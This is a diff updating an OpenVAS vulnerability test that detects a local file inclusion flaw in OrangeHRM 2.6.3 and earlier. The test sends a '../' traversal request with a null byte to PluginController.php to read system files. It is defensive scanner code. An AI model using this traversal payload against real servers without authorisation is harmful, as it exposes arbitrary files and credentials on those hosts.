@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_orangehrm_lfi_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
+# $Id: secpod_orangehrm_lfi_vuln.nasl 11188 2018-09-03 11:04:26Z cfischer $
 #
 # OrangeHRM 'PluginController.php' Local File Inclusion Vulnerability
 #
@@ -24,49 +24,45 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation could allow attackers to perform file
-inclusion attacks and read arbitrary files on the affected application.
-
-Impact Level: Application";
-
-tag_affected = "OrangeHRM version 2.6.3 and prior";
-
-tag_insight = "The flaw is due to input validation error in
-'plugins/PluginController.php' which fails to validate 'path parameter',
-which allows attackers to read arbitrary files via a ../(dot dot) sequences.";
-
-tag_solution = "No solution or patch was made available for at least one year
-since disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.";
-
-tag_summary = "This host is running with OrangeHRM and is prone to local file
-inclusion vulnerability.";
-
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902367");
-  script_version("$Revision: 9351 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
+  script_version("$Revision: 11188 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-03 13:04:26 +0200 (Mon, 03 Sep 2018) $");
   script_tag(name:"creation_date", value:"2011-05-11 15:50:14 +0200 (Wed, 11 May 2011)");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
   script_name("OrangeHRM 'PluginController.php' Local File Inclusion Vulnerability");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17212/");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/100823/OrangeHRM2.6.3-lfi.txt");
-
-  script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2011 SecPod");
-  script_dependencies("gb_orangehrm_detect.nasl", "os_detection.nasl");
   script_family("Web application abuses");
+  script_dependencies("gb_orangehrm_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17212/");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/100823/OrangeHRM2.6.3-lfi.txt");
+
+  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform file
+  inclusion attacks and read arbitrary files on the affected application.
+
+  Impact Level: Application");
+
+  script_tag(name:"affected", value:"OrangeHRM version 2.6.3 and prior");
+
+  script_tag(name:"insight", value:"The flaw is due to input validation error in
+  'plugins/PluginController.php' which fails to validate 'path parameter',
+  which allows attackers to read arbitrary files via a ../(dot dot) sequences.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+
+  script_tag(name:"summary", value:"This host is running with OrangeHRM and is prone to local file
+  inclusion vulnerability.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
   script_tag(name:"solution_type", value:"WillNotFix");
+
   exit(0);
 }
 
@@ -76,36 +72,23 @@ include("host_details.inc");
 include("version_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
 port = get_http_port(default:80);
-if(!port){
-  exit(0);
-}
-
-## Check Host Supports PHP
-if(!can_host_php(port:port)){
-  exit(0);
-}
-
-# Get OrangeHRM Installed Location
 if(!dir = get_dir_from_kb(port:port, app:"orangehrm")){
   exit(0);
 }
 
-## Get Content to be checked and file to be check
+if(dir == "/") dir = "";
+
 files = traversal_files();
 
-foreach file (keys(files))
-{
-  ## Construct attack
-  url = string(dir, "/plugins/PluginController.php?path=",
-                      crap(data:"..%2f",length:3*15),files[file],"%00");
-  
-  ## Confirm exploit worked properly or not
-  if(http_vuln_check(port:port, url:url,pattern:file))
-  {
-    security_message(port:port);
+foreach file (keys(files)){
+  url = string(dir, "/plugins/PluginController.php?path=", crap(data:"..%2f", length:3*15), files[file], "%00");
+
+  if(http_vuln_check(port:port, url:url, pattern:file)){
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
     exit(0);
   }
 }
 
+exit(99);
